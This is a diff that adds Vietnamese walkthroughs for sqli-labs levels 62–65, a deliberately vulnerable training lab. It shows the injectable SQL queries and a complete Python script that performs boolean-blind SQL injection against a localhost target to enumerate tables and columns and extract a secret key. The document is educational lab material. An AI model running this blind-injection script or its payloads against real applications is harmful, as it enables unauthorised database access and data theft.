@@ -10,8 +10,10 @@ Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)
 - [Less-59](#Less-59)
 - [Less-60](#Less-60)
 - [Less-61](#Less-61)
-
-
+- [Less-62](#Less-6)
+- [Less-63](#Less-63)
+- [Less-64](#Less-64)
+- [Less-65](#Less-65)
 
 ## Less-54
 
@@ -164,3 +166,151 @@ Tương tự câu trên. Sử dụng `'))` để escape và inject câu query.
 
 ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-61.png?raw=true)
 
+## Less-62
+
+```mysql
+SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1
+```
+
+Trong câu này, kết quả sẽ không trả về lỗi nữa, mà chỉ trả về `True` khi câu query đúng như hình dưới.
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-62_1.png?raw=true)
+
+Còn đây là kết quả khi lỗi.
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-62_2.png?raw=true)
+
+__Idea__
+
+Về cơ bản, câu này khá giống với câu 8 thuộc dạng `Blind`, dựa vào kết quả là `True` hay `False` để leak ra database, table, column...
+
+Vẫn sử dụng `left()` để đoán các kí tự và sử dụng `length()` để tìm độ dài của table, column...
+
+[Script.py](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-62.py)
+
+```python
+import requests
+import string
+import sys
+
+def get_length(url, comment):
+    s = requests.Session()
+    for i in range(24, 1, -1):
+        r = s.get(url + str(i) + comment).text
+        # print(url + str(i) + comment)
+        if 'Your Password' in r:
+            return i
+
+
+def send(url):
+    s = requests.Session()
+    r = s.get(url).text
+    if 'Your Password' in r:
+        return True
+    else:
+        return False
+
+
+alphabet = string.ascii_uppercase + '_0123456789'
+url = "http://localhost/Less-62/?id=1') and "
+
+table_part1 = "left((select table_name FROM information_schema.tables where table_schema='challenges'),"
+table_part2 = ")='"
+comment = '--+'
+length_table = "length((select table_name FROM information_schema.tables where table_schema='challenges'))="
+count = 1
+result = ""
+tables = ""
+data = ""
+columns = []
+
+
+length = get_length(url + length_table, comment)
+for j in range(length):
+    for c in alphabet:
+        final_url = url + table_part1 + str(count) + table_part2 + (result+c) + "'" + comment
+        # print(final_url)
+        if send(final_url):
+            count += 1
+            result += c
+            sys.stdout.write(c)
+            sys.stdout.flush()
+            # print (result)
+
+# print(result)
+sys.stdout.write("\r\n")
+sys.stdout.flush()
+tables = result
+result = ""
+count = 1
+
+column_part1 = 'left((select column_name from information_schema.columns where table_name="{}" limit '.format(tables)
+column_part2 = ',1),'
+column_part3 = ')="'
+length_column_part1 = 'length((select column_name from information_schema.columns where table_name="{}" limit '.format(tables)
+length_column_part2 = ',1))='
+for i in range(0, 4):
+    length = get_length(url + length_column_part1 + str(i) + length_column_part2, comment)
+    for j in range(length):
+        for c in alphabet:
+            final_url = url + column_part1 + str(i) + column_part2 + str(count) + column_part3 + (result+c) + '"' + comment
+            if send(final_url):
+                count += 1
+                result += c
+                sys.stdout.write(c)
+                sys.stdout.flush()
+
+    sys.stdout.write("\r\n")
+    sys.stdout.flush()
+    columns.append(result)
+    result = ""
+    count = 1
+dump_secret_key_part1 = 'left((select {} from challenges.{}),'.format(columns[2], tables)
+dump_secret_key_part2 = ')="'
+length_data = 'length((select {} from challenges.{}))='.format(columns[2].replace('SECRET','secret'), tables)
+
+length_secret_key = get_length(url + length_data, comment)
+for j in range(length_secret_key):
+    for c in alphabet:
+        final = url + dump_secret_key_part1 + str(count) + dump_secret_key_part2 + (result+c) + '"' + comment
+        if send(final):
+            count += 1
+            result += c
+            sys.stdout.write(c)
+            sys.stdout.flush()
+# print(result)
+sys.stdout.write("\r\n")
+sys.stdout.flush()
+data = result
+result = ""
+count = 1
+
+
+print("[+] Table: {}".format(tables))
+print("[+] Column: {}".format(columns))
+print("[+] Secret key: {}".format(data))
+```
+
+## Less-63
+
+```mysql
+SELECT * FROM security.users WHERE id='$id' LIMIT 0,1
+```
+
+Tương tự câu 62, khác câu query nên chỉ cần sửa code lại một chút là chạy được. [script.py](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-63.py)
+
+## Less-64
+
+```mysql
+SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1
+```
+
+Tương tự câu 62. [script.py](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-64.py).
+
+## Less-65
+
+```mysql
+SELECT * FROM security.users WHERE id=($id) LIMIT 0,1
+```
+
+Tương tự câu 62. [script.py](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-65.py).
